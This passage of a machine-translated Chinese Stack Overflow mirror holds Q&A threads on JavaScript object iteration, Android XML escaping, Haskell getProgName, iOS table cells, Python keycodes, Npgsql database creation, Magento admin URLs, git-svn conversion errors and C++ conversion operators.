for (i = 0; i < 100; i++) { ... } // first part
for (i = 100; i < 300; i++) { ... } // second
for (i = 300; i < arr.length; i++) { ... } // last 
```

但是如何处理对象呢？

* * *

## 回答 #1

> 赞同：1095
> 
> 时间：2013-01-17T12:37:59.373

对于大多数对象，请使用`for .. in`：

```
for (let key in yourobject) {
  console.log(key, yourobject[key]);
} 
```

使用 ES6，如果您同时需要键和值，请执行

```
for (let [key, value] of Object.entries(yourobject)) {
    console.log(key, value);
} 
```

要避免记录继承的属性，请检查[hasOwnProperty](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Object/hasOwnProperty)：

```
for (let key in yourobject) {
   if (yourobject.hasOwnProperty(key)) {
      console.log(key, yourobject[key]);
   }
} 
```

*`hasOwnProperty`如果您使用的是简单对象（例如您自己使用的对象），则无需检查何时对键进行迭代`{}`。*

[这个 MDN 文档](https://developer.mozilla.org/en-US/docs/JavaScript/Guide/Working_with_Objects)更一般地解释了如何处理对象及其属性。

如果你想“分块”做，最好是提取数组中的键。由于无法保证订单，因此这是正确的方法。在现代浏览器中，您可以使用

```
let keys = Object.keys(yourobject); 
```

为了更加兼容，你最好这样做：

```
 let keys = [];
 for (let key in yourobject) {      
     if (yourobject.hasOwnProperty(key)) keys.push(key);
 } 
```

然后你可以通过 index: 迭代你的属性`yourobject[keys[i]]`：

```
for (let i=300; i < keys.length && i < 600; i++) { 
   console.log(keys[i], yourobject[keys[i]]);
} 
```

* * *

## 回答 #2

> 赞同：84
> 
> 时间：2013-01-17T12:40:29.600

这是现代浏览器的另一种迭代解决方案：

```
Object.keys(obj)
  .filter((k, i) => i >= 100 && i < 300)
  .forEach(k => console.log(obj[k])); 
```

或者没有过滤功能：

```
Object.keys(obj).forEach((k, i) => {
    if (i >= 100 && i < 300) {
        console.log(obj[k]);
    }
}); 
```

但是，您必须考虑 JavaScript 对象中的属性没有排序，即没有顺序。

* * *

## 回答 #3

> 赞同：32
> 
> 时间：2018-01-30T06:12:41.973

使用`Object.entries`你做这样的事情。

```
 // array like object with random key ordering
 const anObj = { 100: 'a', 2: 'b', 7: 'c' };
 console.log(Object.entries(anObj)); // [ ['2', 'b'],['7', 'c'],['100', 'a'] ] 
```

Object.entries() 方法返回给定对象自己的可枚举属性 [key, value] 的数组

因此，您可以遍历 Object 并为每个对象拥有`key`and`value`并获得类似的东西。

```
const anObj = { 100: 'a', 2: 'b', 7: 'c' };
Object.entries(anObj).map(obj => {
   const key   = obj[0];
   const value = obj[1];

   // do whatever you want with those values.
}); 
```

或者像这样

```
// Or, using array extras
Object.entries(obj).forEach(([key, value]) => {
  console.log(`${key} ${value}`); // "a 5", "b 7", "c 9"
}); 
```

如需参考，请查看[对象条目的 MDN 文档](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/entries)

* * *

## 回答 #4

> 赞同：19
> 
> 时间：2016-08-04T03:42:06.893

借助新的 ES6/ES2015 特性，您不必再使用对象来迭代哈希。您可以使用[Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map)。Javascript Maps 将键保持在插入顺序中，这意味着您可以迭代它们而无需检查 hasOwnProperty，这一直是一个 hack。

遍历地图：

```
var myMap = new Map();
myMap.set(0, "zero");
myMap.set(1, "one");
for (var [key, value] of myMap) {
  console.log(key + " = " + value);
}
// Will show 2 logs; first with "0 = zero" and second with "1 = one"

for (var key of myMap.keys()) {
  console.log(key);
}
// Will show 2 logs; first with "0" and second with "1"

for (var value of myMap.values()) {
  console.log(value);
}
// Will show 2 logs; first with "zero" and second with "one"

for (var [key, value] of myMap.entries()) {
  console.log(key + " = " + value);
}
// Will show 2 logs; first with "0 = zero" and second with "1 = one" 
```

或使用 forEach：

```
myMap.forEach(function(value, key) {
  console.log(key + " = " + value);
}, myMap)
// Will show 2 logs; first with "0 = zero" and second with "1 = one" 
```

* * *

## 回答 #5

> 赞同：18
> 
> 时间：2018-09-28T18:11:50.477

如果您在迭代时需要*键和值*，可以使用[for...of](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...of)循环和[Object.entries](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/entries)。

```
const myObj = {a: 1, b: 2}

for (let [key, value] of Object.entries(myObj)) {
    console.log(`key=${key} value=${value}`)
}

// output: 
// key=a value=1
// key=b value=2 
```

* * *

## 回答 #6

> 赞同：8
> 
> 时间：2013-01-17T12:44:30.847

唯一可靠的方法是将您的对象数据保存到 2 个数组，一个键和一个用于数据：

```
var keys = [];
var data = [];
for (var key in obj) {
    if (obj.hasOwnProperty(key)) {
        keys.push(key);
        data.push(obj[key]); // Not necessary, but cleaner, in my opinion. See the example below.
    }
} 
```

然后，您可以像往常一样遍历数组：

```
for(var i = 0; i < 100; i++){
    console.log(keys[i], data[i]);
    //or
    console.log(keys[i], obj[keys[i]]); // harder to read, I think.
}
for(var i = 100; i < 300; i++){
    console.log(keys[i], data[i]);
} 
```

我没有使用`Object.keys(obj)`，因为那是 IE 9+。

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2017-12-14T05:56:31.173

*-> 如果我们使用并找到对象数组的键来遍历 JavaScript 对象*

```
Object.keys(Array).forEach(key => {

 console.log('key',key)

}) 
```

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2020-06-26T09:56:07.477

> 如果您有一个简单的对象，则可以使用以下代码对其进行迭代：

```
let myObj = {
  abc: '...',
  bca: '...',
  zzz: '...',
  xxx: '...',
  ccc: '...',
  // ...
};

let objKeys = Object.keys(myObj);

//Now we can use objKeys to iterate over myObj

for (item of objKeys) {
  //this will print out the keys
  console.log('key:', item);

  //this will print out the values 
  console.log('value:', myObj[item]);
}
```

> 如果您有一个嵌套对象，您可以使用以下代码对其进行迭代：

```
let b = {
  one: {
    a: 1,
    b: 2,
    c: 3
  },
  two: {
    a: 4,
    b: 5,
    c: 6
  },
  three: {
    a: 7,
    b: 8,
    c: 9
  }
};

let myKeys = Object.keys(b);

for (item of myKeys) {
  //print the key
  console.log('Key', item)

  //print the value (which will be another object)
  console.log('Value', b[item])

  //print the nested value
  console.log('Nested value', b[item]['a'])
}
```

> 如果您有对象数组，则可以使用以下代码对其进行迭代：

```
let c = [
{
  a: 1,
  b: 2
},
{
  a: 3,
  b: 4
}
];

for(item of c){
//print the whole object individually 
console.log('object', item);

//print the value inside the object
console.log('value', item['a']);
}
```

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2019-10-03T17:11:40.767

```
const o = {
  name: "Max",
  location: "London"
};

for (const [key, value] of Object.entries(o)) {
  console.log(`${key}: ${value}`);
} 
```

**[在线尝试](https://code.labstack.com/BS36AIxC)**

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2013-01-17T12:48:13.667

如果你想一次迭代整个对象，你可以使用`for in`循环：

```
for (var i in obj) {
  ...
} 
```

但是，如果您想将对象分成几部分，实际上是做不到的。无法保证对象中的属性按任何指定的顺序排列。因此，我可以想到两种解决方案。

首先是“删除”已经读取的属性：

```
var i = 0;
for (var key in obj) {
    console.log(obj[key]);
    delete obj[key];
    if ( ++i > 300) break;
} 
```

我能想到的另一个解决方案是使用 Array of Arrays 而不是对象：

```
var obj = [['key1', 'value1'], ['key2', 'value2']]; 
```

然后，标准`for`循环将起作用。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2018-02-15T23:10:04.967

我终于想出了一个方便的实用函数，它有一个统一的接口来迭代对象、字符串、数组、TypedArrays、Maps、Sets（任何 Iterables）。

```
const iterate = require('@a-z/iterate-it');
const obj = { a: 1, b: 2, c: 3 };

iterate(obj, (value, key) => console.log(key, value)); 
// a 1
// b 2
// c 3 
```

[https://github.com/alrik/iterate-javascript](https://github.com/alrik/iterate-javascript)

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2018-09-28T08:09:54.530

对于对象迭代，我们通常使用`for..in`循环。该结构将遍历所有**可枚举**的属性，包括通过原型继承继承的属性。例如：

```
let obj = {
  prop1: '1',
  prop2: '2'
}

for(let el in obj) {
  console.log(el);
  console.log(obj[el]);
}
```

但是，`for..in`它将遍历所有可枚举元素，这将无法让我们将迭代分成块。为此，我们可以使用内置`Object.keys()`函数来检索数组中对象的所有键。然后，我们可以将迭代拆分为多个 for 循环并使用键数组访问属性。例如：

```
let obj = {
  prop1: '1',
  prop2: '2',
  prop3: '3',
  prop4: '4',
};

const keys = Object.keys(obj);
console.log(keys);

for (let i = 0; i < 2; i++) {
  console.log(obj[keys[i]]);
}

for (let i = 2; i < 4; i++) {
  console.log(obj[keys[i]]);
}
```

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2019-05-28T08:14:36.807

是的。您可以使用 for 循环遍历对象。这是一个例子

```
var myObj = {
    abc: 'ABC',
    bca: 'BCA',
    zzz: 'ZZZ',
    xxx: 'XXX',
    ccc: 'CCC',
}

var k = Object.keys (myObj);
for (var i = 0; i < k.length; i++) {
    console.log (k[i] + ": " + myObj[k[i]]);
}
```

**注意：**上面提到的例子只适用于 IE9+。[请参阅此处](https://caniuse.com/#search=object.keys)的Objec.keys 浏览器支持。

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2020-08-26T06:21:42.870

```
<script type="text/javascript">
// method 1
var images = {};
images['name'] = {};
images['family'] = {};
images[1] = {};
images['name'][5] = "Mehdi";
images['family'][8] = "Mohammadpour";
images['family']['ok'] = 123456;
images[1][22] = 2602;
images[1][22] = 2602;
images[1][22] = 2602;
images[1][22] = 2602;
images[1][23] = 2602;

for (const [key1, value1] of Object.entries(images)){
    for (const [key2, value2] of Object.entries(value1)){
        console.log(`${key1} => ${key2}: ${value2}`);
    }
}

console.log("=============================");

// method 2
var arr = [];
for(var x = 0; x < 5; x++){
     arr[x] = [];    
     for(var y = 0; y < 5; y++){ 
         arr[x][y] = x*y;    
     }    
 }

for(var i = 0; i < arr.length; i++) {
    var cube = arr[i];
    for(var j = 0; j < cube.length; j++) {
        console.log("cube[" + i + "][" + j + "] = " + cube[j]);
    }
}

</script> 
```

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2016-07-03T22:51:51.777

```
var Dictionary = {
  If: {
    you: {
      can: '',
      make: ''
    },
    sense: ''
  },
  of: {
    the: {
      sentence: {
        it: '',
        worked: ''
      }
    }
  }
};

function Iterate(obj) {
  for (prop in obj) {
    if (obj.hasOwnProperty(prop) && isNaN(prop)) {
      console.log(prop + ': ' + obj[prop]);
      Iterate(obj[prop]);
    }
  }
}
Iterate(Dictionary); 
```

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2018-04-09T06:34:41.877

您可以尝试使用[lodash - 一个现代 JavaScript 实用程序库，提供模块化、性能和附加](https://lodash.com/)js 以快速对象迭代：-

```
var  users  =   {
    'fred':     { 
        'user':   'fred',
            'age':  40 
    },
    'pebbles':  { 
        'user':   'pebbles',
         'age':  1 
    }
}; 
_.mapValues(users,  function(o)  { 
    return  o.age; 
});
// => { 'fred': 40, 'pebbles': 1 } (iteration order is not guaranteed)
// The `_.property` iteratee shorthand.
console.log(_.mapValues(users,  'age')); // returns age property & value 
console.log(_.mapValues(users,  'user')); // returns user property & value 
console.log(_.mapValues(users)); // returns all objects 
// => { 'fred': 40, 'pebbles': 1 } (iteration order is not guaranteed)
```

```
<script src="https://cdnjs.cloudflare.com/ajax/libs/lodash-compat/3.10.2/lodash.js"></script>
```

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2018-04-28T02:14:02.627

真正的 PITA，这不是标准 Javascript 的一部分。

```
/**
 * Iterates the keys and values of an object.  Object.keys is used to extract the keys.
 * @param object The object to iterate
 * @param fn (value,key)=>{}
 */
function objectForEach(object, fn) {
    Object.keys(object).forEach(key => {
        fn(object[key],key, object)
    })
} 
```

注意：我将回调参数切换为 (value,key) 并添加了第三个对象以使 API 与其他 API 保持一致。

像这样使用它

```
const o = {a:1, b:true};
objectForEach(o, (value, key, obj)=>{
    // do something
}); 
```

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2020-08-19T12:13:36.073

这是一个手工制作的解决方案：

```
function iterationForObject() {
    let base = 0,
        Keys= Object.keys(this);
    return {
        next: () => {
            return {
                value: {
                    "key": Keys[base],
                    "value": this[Keys[base]]
                },
                done: !(base++ < Keys.length)
            };
        }
    };
}
Object.prototype[Symbol.iterator] = iterationForObject; 
```

然后你可以循环任何对象：

```
for ( let keyAndValuePair of (Object Here) ) {
    console.log(`${keyAndValuePair.key} => ${keyAndValuePair.value}`);
} 
```

# android - DOM 解析器无法解析特殊字符

> ID：14379281
> 
> 赞同：0
> 
> 时间：2013-01-17T12:36:42.713
> 
> 标签：android, xml-parsing

我正在使用 Dom 解析器进行 xml 解析，它在 android 4 中运行良好。但它无法在 android 2 中解析 '&'。例如..如果字符串“Android & iPhone”那么它只需要“Android”。任何帮助将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:42:08.960

这是因为 & 号是 XML 中的特殊字符。尝试`&amp;`改用。

编辑：

要转义所有特殊字符，您可以使用`StringEscapeUtils.escapeXml(String str)`Apache [commons library](http://commons.apache.org/)，如[该线程](https://stackoverflow.com/questions/1265282/recommended-method-for-escaping-html-in-java)中所述。

[您可以在此处](http://commons.apache.org/lang/download_lang.cgi)下载 Apache 公共库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-04-26T14:56:23.550

您也可以将其视为 XPL 并直接将其处理为 XML。XPL (eXtensible Process Language) 与 XML 类似，但它允许 XML 在文本元素中使用“特殊字符”。[可扩展过程语言的链接](http://hll.nu)

# haskell - 确定执行脚本的名称

> ID：14379283
> 
> 赞同：2
> 
> 时间：2013-01-17T12:36:50.787
> 
> 标签：haskell

在 haskell 中，我将如何获取并打印出执行脚本的名称？另外，因为我在这里使用一些代码列出目录内容并在控制台（GHCi）上打印出来，所以我只是从我对其他语言的了解中得到以下结果“[]”我认为这是因为它返回一个数组但是 print 无论如何都应该打印数组，不是吗？

这是在窗户上

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-17T12:51:55.733

我认为`getProgName`from`System.Environment`应该这样做，但您应该检查它在 Windows 上的便携性。

`"[]"`是空列表。您可以使用`getDirectoryContents`来自`System.Directory`.

```
Prelude System.Directory> getDirectoryContents "."
["hist","parse.hs","b.hs","d.hs","qsort.hs"] 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-01-17T12:51:35.500

该[`System.Environment`](http://hackage.haskell.org/packages/archive/base/latest/doc/html/System-Environment.html)模块用于访问有关系统环境的信息，例如[`getProgName`](http://hackage.haskell.org/packages/archive/base/latest/doc/html/System-Environment.html#v:getProgName)返回可执行文件的名称。

结果`[]`是一个空列表，因此您似乎正在尝试列出空目录的内容。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-17T16:51:01.367

正如已经提到的 getProgName 应该为您解决问题。如果您不熟悉 haskell 的 I/O 功能，我建议您在《Learn You a Haskell for Great Good》之类的书中阅读有关它的内容。它有一个关于 I/O 的非常好的章节，包括命令行参数。见[http://learnyouahaskell.com/input-and-output#command-line-arguments](http://learnyouahaskell.com/input-and-output#command-line-arguments)

# iphone - TableViewCell 中标签和图像的位置在扩展 TableViewCell 时发生变化

> ID：14379284
> 
> 赞同：1
> 
> 时间：2013-01-17T12:36:54.000
> 
> 标签：iphone, ios, uitableview

我是这个 xcode 的新手。我试图在`UITableViewCell`双击时显示更多细节。所以我正在扩展`UITableViewCell`. 在扩展 时`UITableViewCell`，在扩展单元格之前可见的标签和图像正在改变它们的位置，即它们正在移动到 的扩展部分`UITableViewCell`。请给我建议。

提前致谢...

```
-(CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath
{
    if (selectedRow && indexPath.row == tappedRow && tapCount == 2)
    {
        return 200;
    }
       return 62;
}

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    if(tapCount == 1 && tappedRow == indexPath.row){

        tapCount = tapCount + 1;
        annotate.hidden =YES;
        selectedRow = [tableView indexPathForSelectedRow];
        [tableView reloadRowsAtIndexPaths:[NSArray arrayWithObject:indexPath]withRowAnimation:UITableViewRowAnimationNone];

        annotate.hidden = NO;
        [UIView commitAnimations];

    }
    else if (tapCount == 0){

        tapCount = tapCount +1;
        tappedRow = indexPath.row;
    }

    else if (tapCount ==2 && tappedRow == indexPath.row){

        tapCount = 0;
        annotate.hidden = YES;
        [tableView setRowHeight:62];
        [tableView reloadData];
        [annotate release];
    }

    else if (tappedRow != indexPath.row){

        tapCount = 1;
        tappedRow = indexPath.row;
        annotate.hidden = YES;
        [annotate release];
    }

}

- (UITableViewCell *)tableView: (UITableView *)tableView cellForRowAtIndexPath: (NSIndexPath *)indexPath
{
    UITableViewCell *cell = [self.tableView dequeueReusableCellWithIdentifier:@"ChooseAPlayer"];
    UILabel *lblName = (UILabel *)[cell viewWithTag:101];
    [lblName setText:[inputPlayersList objectAtIndex:[indexPath row]]];

    UILabel *Teams = (UILabel *)[cell viewWithTag:103];
    [Teams setText:[inputPlayersTeams objectAtIndex:[indexPath row]]];

    UILabel *AwayTeams = (UILabel *)[cell viewWithTag:104];
    [AwayTeams setText:[inputPlayersAwayteams objectAtIndex:[indexPath row]]];

    UILabel *PlayersPrice = (UILabel *)[cell viewWithTag:105];
    [PlayersPrice setText:[inputPlayersPrice objectAtIndex:[indexPath row]]];

    annotate.hidden = YES;

    if ( indexPath.row == tappedRow && tapCount == 2)
    {
    annotate.hidden = YES;
    annotate.tag = indexPath.row;
    annotate = [[UIView alloc] init];
    annotate.frame = CGRectMake(0, 62, 320, 138);
    annotate.backgroundColor = [UIColor greenColor];

    [cell.contentView addSubview:annotate];

    }
    UIImage *image = [UIImage   imageNamed:@"Select_white.png"];
                      UIButton *button = [UIButton buttonWithType:UIButtonTypeCustom];
    CGRect frame = CGRectMake(44.0, 44.0, image.size.width, image.size.height);
    button.frame = frame;
    [button setBackgroundImage:image forState:UIControlStateNormal];
    [button addTarget:self action:@selector(accessoryButtonTapped:event:) forControlEvents:UIControlEventTouchUpInside];
    button.backgroundColor = [UIColor clearColor];
    cell.accessoryView = button;

    return cell;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T12:53:23.703

将表格视图单元格中标签的自动调整大小设置为，`UIViewAutoresizingNone`以便在调整父视图大小后它们不会改变。

我希望这会有所帮助。

# python - 将 Unicode 键码解码为字符串

> ID：14379285
> 
> 赞同：1
> 
> 时间：2013-01-17T12:36:55.627
> 
> 标签：python, unicode, keycode

使用 Python，我正在从 Firefox 扩展生成的日志文件中读取行。日志中的输入之一是一个数字，表示 Event.keycode() 返回的值，该值已用于 keyup 事件。

在阅读日志时，我想将这些键码值转换为它们所代表的字符。

示例日志文件行：

```
1338899783924,keyup,[object HTMLInputElement],true,true,false,undefined,undefined,undefined,undefined,16,undefined,false,undefined,undefined,undefined,false 
```

在这种情况下，16 是 Event.keycode 返回的值

已经在 J​​ava 中使用脚本引擎解决了这个问题，并使用 javascript 转换了值。也许这也可以用于python？

*注意：* 仅限 Python，数据已经收集，没有更改扩展名或 w/e

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T12:46:57.877

假设 keycode 是 Unicode 代码点，那该怎么办？

```
chr(int(line.split(",")[10])) 
```

另请参阅[chr的 python 文档](http://docs.python.org/3/library/functions.html#chr)

# c# - 无法首先使用 Npgsql 和实体框架代码在 PostreSQL 中创建数据库

> ID：14379288
> 
> 赞同：6
> 
> 时间：2013-01-17T12:37:00.053
> 
> 标签：c#, entity-framework, postgresql, npgsql

我正在尝试设置我的应用程序以将 Entity Framework 与 PostgreSQL 一起使用，但我遇到了一个问题。我已`Npqsql`通过 nuget 添加，并将以下提供程序工厂添加到`web.config`：

```
<system.data>
    <DbProviderFactories>
        <add name="Npgsql Data Provider" 
           invariant="Npgsql" 
           description=".Net Framework Data Provider for Postgresql Server" 
           type="Npgsql.NpgsqlFactory, Npgsql, 
                 Version=2.0.12.0, Culture=neutral, 
                 PublicKeyToken=5d8b90d52f46fda7" />
    </DbProviderFactories>
  </system.data> 
```

使用连接字符串：

```
 <add name="MyDb" providerName="Npgsql" 
connectionString="Server=localhost;Port=5432;Database=withoomph;User ID=postgres;Password=******;enlist=true" /> 
```

它似乎可以很好地连接到数据库，但是当我尝试对数据库执行任何类型的操作时，我得到以下异常：

`FATAL: 3D000: database "withoomph" does not exist`

当数据库设置如下时，我正在正确设置数据库初始化程序：

```
static MyDB()
{
    Database.SetInitializer<MyDB>(new CreateDatabaseIfNotExists<MyDB>());
} 
```

所以当我尝试用我的权利做任何事情时，它应该只是简单地创建数据库`DbContext`？我不明白，整个早上都在拉我的头发！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-06T21:08:35.803

不幸的是，Npgsql 没有（截至目前）自动模式创建代码优先。

您可以先创建数据库，然后再连接到它。

更新（2016 年）：Npgsql 3 现在首先实现数据库创建代码。`NpgsqlConnection`确保通过代码或 XML 设置配置正确的连接工厂以使用s，并使用适当的[Connection String](https://www.connectionstrings.com/npgsql/)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-18T07:32:38.540

毫不奇怪，由于您的数据库`withoomph`尚未创建，因此您不应该在`Database=withoomph;`提到的地方使用连接字符串。

您可以做的是使用`createdb`或手动创建此数据库`psql`，或者临时更改连接字符串以`Database=postgres;`代替使用。

这应该可以工作，因为在所有最新的 PostgreSQL 版本上，数据库`postgres`在 vanilla 安装后都保证存在，并且应该仅用于此目的 - 获取初始经过身份验证的连接以创建另一个数据库并`CREATE DATABASE withoomph;`在您的应用程序中发布。

但是，在创建新数据库后，您应该立即断开连接`postgres`，连接到新数据库`withoomph`并正常继续。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-03-10T09:29:50.720

除了 mvp 的回答，这是我用来创建数据库的代码片段。您需要在初始化 EF 之前运行它。因此，诀窍是将数据库名称临时切换为“postgres”，在安装 vanilla 后保证存在。

```
public void CreateDatabase(string connectionString)
{
    var builder = new NpgsqlConnectionStringBuilder(connectionString);
    var databaseName = builder.Database; // REMEMBER ORIGINAL DB NAME
    builder.Database = "postgres"; // TEMPORARILY USE POSTGRES DATABASE

    // Create connection to database server
    using (var connection = new NpgsqlConnection(builder.ConnectionString))
    {
        connection.Open();

        // Create database
        var createCommand = connection.CreateCommand();
        createCommand.CommandText = string.Format(@"CREATE DATABASE ""{0}"" ENCODING = 'UTF8'", databaseName);
        createCommand.ExecuteNonQuery();

        connection.Close();
    }
} 
```

# url - Magento 更改完整的管理员网址

> ID：14379290
> 
> 赞同：1
> 
> 时间：2013-01-17T12:37:12.800
> 
> 标签：url, admin, magento

我需要完全更改我的管理员网址。例如，我的商店 url 是`www.domain.com`并且对于管理员访问它：`www.domain.com/admin` 我想更改`www.domain.com/admin`为`www.newdomain.com/admin`但想访问旧 url 上的店面`www.domain.com`。这在 Magento 中可行吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T15:54:02.263

您可以在后端更轻松地做到这一点：

```
System > Config > Admin > Admin base url(?)

use own admin url
use own admin path 
```

我目前只有一个德国 magento，但您可以在左侧菜单末尾的配置中找到它（管理员）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-29T16:22:09.973

步骤 1：- 转到根文件夹比

```
app/etc/local.xml 
```

打开 local.xml 文件并在“CDATA [admin]”代码下方更改。

```
 <admin>
        <routers>
            <adminhtml>
                <args>
                    <frontName><![CDATA[admin]]></frontName>
                </args>
            </adminhtml>
        </routers>
    </admin> 
```

注意：- 仅使用小字符。

步骤 2：- 转到 var/ 文件夹并删除缓存文件夹。现在用你的新管理员名称 url 打开管理员 ..

# git - 将颠覆存储库转换为 git，为什么我看到“致命：不是有效的对象名称”？

> ID：14379292
> 
> 赞同：4
> 
> 时间：2013-01-17T12:37:17.677
> 
> 标签：git, svn, repository, git-svn

我在将 subversion repo 转换为 git 时看到以下输出。

```
> Found possible branch point: <repo-url>/trunk => <repo-url>/branches/CMT_PHASE3, 18441
> fatal: Not a valid object name refs/remotes/BlueSimViewer 5.0 20110316 Branch
> cat-file commit refs/remotes/BlueSimViewer 5.0 20110316 Branch: command returned error: 128 
```

我正在运行以转换 repo 的命令是

```
> git svn clone <repo-url> -A authors-transform.txt --stdlayout converted-git > svnlog 
```

这个过程已经转换了 117 个分支，其中一些分支的名称中有空格。我首先发现[了这个 SO question](https://stackoverflow.com/questions/11365317/git-svn-clone-fails-fatal-not-a-valid-object-name)，它帮助我从 git 1.8.xx 解决的上一个问题向前推进

非常感谢有关此问题的原因以及解决此问题的可能方法的任何见解。

我在 Ubuntu 12.10 服务器上运行 git 版本 1.8.1.1。我很乐意提供任何其他有用的信息。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-17T14:34:36.517

我找到了解决方案，但我对结果不满意。如果有人可以提供一种方法来做到这一点而不会忽略有问题的分支，那么我很乐意接受他或她的回答。

对于引发此错误的每个分支/标记，打开以下文件

```
git-repo-name/.git/packged-refs 
```

并在包含有问题的分支/标签的行的开头放置一个井号 (#)。

例如，关于我的问题

```
b88c4df0d47a9ca43c2d0ffd4a1f6e471f98aebc refs/remotes/BlueSimViewer%205.0%2020110316%20Branch 
```

变成

```
#b88c4df0d47a9ca43c2d0ffd4a1f6e471f98aebc refs/remotes/BlueSimViewer%205.0%2020110316%20Branch 
```

这将该行标记为注释，git 将继续转换过程，同时忽略有问题的分支。

在撰写此答案时，我仍在转换。虽然这个解决方案意味着遗漏了一些分支，但至少我会知道哪些分支不存在。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2015-12-04T09:21:39.933

现在可能为时已晚，但我想我至少找到了一个奇怪的解决方案。

打开`git-repo-name/.git/packged-refs`您提到的文件并替换`%20`for 空格，保存文档并重试。为我工作。

使用 UTF-8 在 Notepad++ 中编辑。

Git 版本：（`git version 2.6.2.windows.1`通过 git bash 赢得 7 64x）。

# c++ - 返回值和局部变量的区别

> ID：14379295
> 
> 赞同：7
> 
> 时间：2013-01-17T12:37:33.750
> 
> 标签：c++, constructor, return-value, local-variables, conversion-operator

假设我有

```
#include <string>

class A
{
public:
    template<class T>
    operator T();

    A child();
};

void f()
{
    A a;
    std::string s1 = a;            // ok
    std::string s2 = a.child();    // error (line 34)

    s1 = a;           // error (line 36)
    s2 = a.child();   // error (line 37)

} 
```

std::string 构造函数可以采用 char* 或 std::string 引用，这就是赋值不明确的原因。但是为什么我的编译器（VC++10）抱怨第二个赋值而不是第一个呢？

我正在寻找一种方法来优先考虑模板转换运算符而不是重载的构造函数。

我收到以下错误：

```
1>------ Build started: Project: Plasma4Test, Configuration: Debug Win32 ------
1>  Plasma4Test.cpp
1>d:\bitbucket\vx\projects\plasma4test\plasma4test.cpp(34): error C2440: 'initializing' : cannot convert from 'A' to 'std::basic_string<_Elem,_Traits,_Ax>'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>,
1>              _Ax=std::allocator<char>
1>          ]
1>          No constructor could take the source type, or constructor overload resolution was ambiguous
1>d:\bitbucket\vx\projects\plasma4test\plasma4test.cpp(36): error C2593: 'operator =' is ambiguous
1>          c:\program files\microsoft visual studio 10.0\vc\include\xstring(772): could be 'std::basic_string<_Elem,_Traits,_Ax> &std::basic_string<_Elem,_Traits,_Ax>::operator =(_Elem)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>,
1>              _Ax=std::allocator<char>
1>          ]
1>          c:\program files\microsoft visual studio 10.0\vc\include\xstring(767): or       'std::basic_string<_Elem,_Traits,_Ax> &std::basic_string<_Elem,_Traits,_Ax>::operator =(const _Elem *)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>,
1>              _Ax=std::allocator<char>
1>          ]
1>          c:\program files\microsoft visual studio 10.0\vc\include\xstring(762): or       'std::basic_string<_Elem,_Traits,_Ax> &std::basic_string<_Elem,_Traits,_Ax>::operator =(const std::basic_string<_Elem,_Traits,_Ax> &)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>,
1>              _Ax=std::allocator<char>
1>          ]
1>          while trying to match the argument list '(std::string, A)'
1>d:\bitbucket\vx\projects\plasma4test\plasma4test.cpp(37): error C2593: 'operator =' is ambiguous
1>          c:\program files\microsoft visual studio 10.0\vc\include\xstring(772): could be 'std::basic_string<_Elem,_Traits,_Ax> &std::basic_string<_Elem,_Traits,_Ax>::operator =(_Elem)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>,
1>              _Ax=std::allocator<char>
1>          ]
1>          c:\program files\microsoft visual studio 10.0\vc\include\xstring(767): or       'std::basic_string<_Elem,_Traits,_Ax> &std::basic_string<_Elem,_Traits,_Ax>::operator =(const _Elem *)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>,
1>              _Ax=std::allocator<char>
1>          ]
1>          c:\program files\microsoft visual studio 10.0\vc\include\xstring(762): or       'std::basic_string<_Elem,_Traits,_Ax> &std::basic_string<_Elem,_Traits,_Ax>::operator =(const std::basic_string<_Elem,_Traits,_Ax> &)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>,
1>              _Ax=std::allocator<char>
1>          ]
1>          c:\program files\microsoft visual studio 10.0\vc\include\xstring(707): or       'std::basic_string<_Elem,_Traits,_Ax> &std::basic_string<_Elem,_Traits,_Ax>::operator =(std::basic_string<_Elem,_Traits,_Ax> &&)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>,
1>              _Ax=std::allocator<char>
1>          ]
1>          while trying to match the argument list '(std::string, A)'
========== Build: 0 succeeded, 1 failed, 0 up-to-date, 0 skipped ========== 
```

